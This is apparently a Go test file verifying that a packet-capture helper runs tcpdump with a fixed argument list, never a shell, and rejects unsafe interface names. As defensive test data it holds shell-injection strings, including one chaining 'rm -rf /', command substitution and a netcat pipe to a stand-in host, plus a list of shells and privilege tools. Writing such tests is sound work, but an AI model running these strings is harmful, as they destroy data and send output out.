package live

import (
	"os"
	"path/filepath"
	"strings"
	"testing"
)

// SR-12: operator-supplied interface names and BPF filters never reach a shell. The capture command is a fixed argv
// that executes tcpdump itself; a filter is one argument after "--", and an interface name that could be an option
// or carry shell syntax is refused. SR-60: a missing tcpdump is reported, never worked around.
func TestCaptureArgumentsAreNotShellCode(t *testing.T) {
	bin := t.TempDir()
	tcpdump := filepath.Join(bin, "tcpdump")
	if err := os.WriteFile(tcpdump, []byte("#!/bin/sh\nexit 0\n"), 0o700); err != nil {
		t.Fatal(err)
	}
	t.Setenv("PATH", bin)

	hostile := "port 80; rm -rf / && $(id) `id` | nc evil 1 > /tmp/x"
	argv, err := CaptureCommand("eth0", hostile)
	if err != nil {
		t.Fatal(err)
	}
	if argv[0] != tcpdump {
		t.Fatalf("argv[0] = %q, want the tcpdump executable itself", argv[0])
	}
	for _, a := range argv {
		if base := filepath.Base(a); base == "sh" || base == "bash" || a == "-c" || base == "sudo" || base == "doas" || base == "pkexec" {
			t.Fatalf("argv carries %q: %q", a, argv)
		}
	}
	if argv[len(argv)-2] != "--" || argv[len(argv)-1] != "ip and ("+hostile+")" {
		t.Fatalf("the filter is not one argument after --: %q", argv)
	}
	if count := strings.Count(strings.Join(argv, "\x00"), hostile); count != 1 {
		t.Fatalf("the filter appears %d times: %q", count, argv)
	}
	for i, a := range argv {
		if a == "-i" && argv[i+1] != "eth0" {
			t.Fatalf("interface argument %q", argv[i+1])
		}
	}

	for _, iface := range []string{"", "-w", "--help", "eth0;id", "eth0 lo", "$(id)", "`id`", "eth0|nc", "eth0&", "../x", "a/b",
		"eth0\n", strings.Repeat("a", 129)} {
		if _, err := CaptureCommand(iface, "tcp"); err == nil || err.Error() != "Invalid interface name" {
			t.Errorf("interface %q: error %v, want a refusal", iface, err)
		}
	}
	for _, filter := range []string{"", "tcp\x00; id", strings.Repeat("a", 4097)} {
		if _, err := CaptureCommand("eth0", filter); err == nil {
			t.Errorf("filter %q was accepted", filter)
		}
	}

	t.Setenv("PATH", t.TempDir())
	if _, err := CaptureCommand("eth0", "tcp"); err == nil || !strings.Contains(err.Error(), "tcpdump not found") {
		t.Fatalf("missing tcpdump: error %v, want it reported", err)
	}
}
